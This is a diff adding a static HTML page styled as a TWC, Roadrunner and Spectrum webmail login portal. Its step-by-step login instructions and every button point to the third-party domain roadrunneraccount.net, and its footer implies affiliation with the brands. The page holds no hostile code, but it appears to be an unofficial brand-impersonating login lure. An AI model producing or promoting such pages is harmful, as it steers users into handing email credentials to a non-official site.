@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TWC & Roadrunner RR Email Login | Spectrum Webmail Access</title>
+    
+    <!-- Search Engine Verification -->
+    <meta name="google-site-verification" content="lU6MgVAmLQXn6EdigLoRQJ7jv9PkygMrLRQtjbuk5xQ" />
+    <meta name="msvalidate.01" content="649552A7F8FC8C674CD07172F20F2D02" />
+    
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <!-- Zendesk Widget -->
+    <script id="ze-snippet" src="https://static.zdassets.com/ekr/snippet.js?key=7668c976-0fb7-47ee-8740-3e9115bdb10f"></script>
+    
+    <style>
+        :root {
+            --primary: #0047ba;
+            --secondary: #ff8c00;
+            --dark: #003366;
+            --light: #f8f9fa;
+        }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            background: var(--light);
+            color: #333;
+        }
+        header {
+            background: linear-gradient(135deg, var(--primary), var(--dark));
+            color: white;
+            padding: 2rem 0;
+            text-align: center;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+        .logo-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 1rem;
+            margin-bottom: 1.5rem;
+        }
+        .logo {
+            font-size: 2rem;
+            font-weight: 700;
+        }
+        .logo.twc { color: #fff; }
+        .logo.rr { color: var(--secondary); }
+        .logo.spectrum { color: #00a2e0; }
+        .tagline {
+            font-size: 1.1rem;
+            opacity: 0.9;
+            margin-bottom: 1.5rem;
+        }
+        .login-btn {
+            display: inline-block;
+            background: var(--secondary);
+            color: white;
+            padding: 0.8rem 2rem;
+            border-radius: 30px;
+            text-decoration: none;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            margin: 0.5rem;
+        }
+        .login-btn:hover {
+            background: #e67e00;
+            transform: translateY(-2px);
+        }
+        .container {
+            max-width: 1200px;
+            margin: 2rem auto;
+            padding: 0 1.5rem;
+        }
+        .service-tabs {
+            display: flex;
+            justify-content: center;
+            margin: 2rem 0;
+            flex-wrap: wrap;
+        }
+        .service-tab {
+            padding: 1rem 2rem;
+            background: white;
+            border: 1px solid #ddd;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        .service-tab.active {
+            background: var(--primary);
+            color: white;
+            border-color: var(--primary);
+        }
+        .service-content {
+            display: none;
+            background: white;
+            padding: 2rem;
+            border-radius: 8px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+        }
+        .service-content.active {
+            display: block;
+        }
+        .service-content h2 {
+            color: var(--primary);
+            margin-bottom: 1.5rem;
+        }
+        .login-steps {
+            margin: 1.5rem 0;
+        }
+        .login-steps li {
+            margin-bottom: 1rem;
+        }
+        footer {
+            background: #333;
+            color: white;
+            text-align: center;
+            padding: 2rem 0;
+            margin-top: 3rem;
+        }
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 1.5rem;
+            margin: 1rem 0;
+            flex-wrap: wrap;
+        }
+        .footer-links a {
+            color: var(--secondary);
+            text-decoration: none;
+        }
+        @media (max-width: 768px) {
+            .logo { font-size: 1.5rem; }
+            .service-tab { padding: 0.8rem 1rem; }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="logo-container">
+            <div class="logo twc">TWC</div>
+            <div class="logo rr">Roadrunner RR</div>
+            <div class="logo spectrum">Spectrum</div>
+        </div>
+        <p class="tagline">Secure webmail access for all your email services</p>
+        <a href="https://roadrunneraccount.net" class="login-btn">
+            <i class="fas fa-sign-in-alt"></i> Login Now
+        </a>
+    </header>
+
+    <div class="container">
+        <div class="service-tabs">
+            <div class="service-tab active" onclick="showService('twc')">TWC Mail</div>
+            <div class="service-tab" onclick="showService('rr')">Roadrunner RR</div>
+            <div class="service-tab" onclick="showService('spectrum')">Spectrum</div>
+        </div>
+
+        <div id="twc" class="service-content active">
+            <h2><i class="fas fa-envelope"></i> TWC Mail Login</h2>
+            <p>Access your Time Warner Cable email account with secure login.</p>
+            <ol class="login-steps">
+                <li>Click the "Login Now" button above</li>
+                <li>Enter your full TWC email address</li>
+                <li>Enter your password</li>
+                <li>Complete any security verification if prompted</li>
+            </ol>
+            <a href="https://roadrunneraccount.net" class="login-btn">
+                <i class="fas fa-sign-in-alt"></i> TWC Mail Login
+            </a>
+        </div>
+
+        <div id="rr" class="service-content">
+            <h2><i class="fas fa-envelope"></i> Roadrunner RR Email Login</h2>
+            <p>Sign in to your Roadrunner RR webmail account.</p>
+            <ol class="login-steps">
+                <li>Use the login button at the top of the page</li>
+                <li>Enter your Roadrunner email (e.g., user@rr.com)</li>
+                <li>Type your password</li>
+                <li>Click "Sign In" to access your inbox</li>
+            </ol>
+            <a href="https://roadrunneraccount.net" class="login-btn">
+                <i class="fas fa-sign-in-alt"></i> Roadrunner Login
+            </a>
+        </div>
+
+        <div id="spectrum" class="service-content">
+            <h2><i class="fas fa-envelope"></i> Spectrum Webmail Login</h2>
+            <p>Access your Spectrum email with our secure webmail portal.</p>
+            <ol class="login-steps">
+                <li>Click any login button on this page</li>
+                <li>Enter your Spectrum email address</li>
+                <li>Provide your account password</li>
+                <li>Access your emails from any device</li>
+            </ol>
+            <a href="https://roadrunneraccount.net" class="login-btn">
+                <i class="fas fa-sign-in-alt"></i> Spectrum Login
+            </a>
+        </div>
+    </div>
+
+    <footer>
+        <div class="footer-links">
+            <a href="#">Privacy Policy</a>
+            <a href="#">Terms of Service</a>
+            <a href="#">Support Center</a>
+            <a href="#">Contact Us</a>
+        </div>
+        <p>© 2025 TWC, Roadrunner RR, and Spectrum Webmail Services. All rights reserved.</p>
+    </footer>
+
+    <script>
+        function showService(serviceId) {
+            // Hide all service contents
+            document.querySelectorAll('.service-content').forEach(content => {
+                content.classList.remove('active');
+            });
+            
+            // Remove active class from all tabs
+            document.querySelectorAll('.service-tab').forEach(tab => {
+                tab.classList.remove('active');
+            });
+            
+            // Show selected service and activate tab
+            document.getElementById(serviceId).classList.add('active');
+            event.currentTarget.classList.add('active');
+        }
+    </script>
+</body>
+</html>
